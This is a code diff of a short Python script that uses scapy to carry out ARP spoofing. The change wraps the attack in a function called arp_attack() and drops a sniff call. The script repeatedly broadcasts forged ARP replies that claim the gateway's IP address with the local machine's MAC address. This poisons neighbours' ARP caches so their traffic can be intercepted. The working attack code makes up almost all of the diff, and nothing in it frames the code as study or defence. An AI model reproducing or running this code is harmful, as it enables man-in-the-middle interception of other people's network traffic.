@@ -1,27 +1,28 @@
 # coding=utf-8
 
-
 from scapy.all import ARP
 from scapy.all import *
 import socket
 import struct
 from tools import *
+import datetime
 
-arpFake = ARP()
 
-psrc = get_gate_way()
-pdst = get_broadcast()
-hwsrc = get_mac_address()
+def arp_attack():
+    arpFake = ARP()
 
-arpFake.psrc = psrc
-arpFake.pdst = pdst
-arpFake.hwsrc = hwsrc
-arpFake.op = 2
+    psrc = get_gate_way()
+    pdst = get_broadcast()
+    hwsrc = get_mac_address()
 
-while 1:
-    send(arpFake)
-    print 'arp send'
-    sniff(filter="arp", count=1)
+    arpFake.psrc = psrc
+    arpFake.pdst = pdst
+    arpFake.hwsrc = hwsrc
+    arpFake.op = 2
+
+    while 1:
+        send(arpFake)
+        print 'arp send'
 
 
 '''
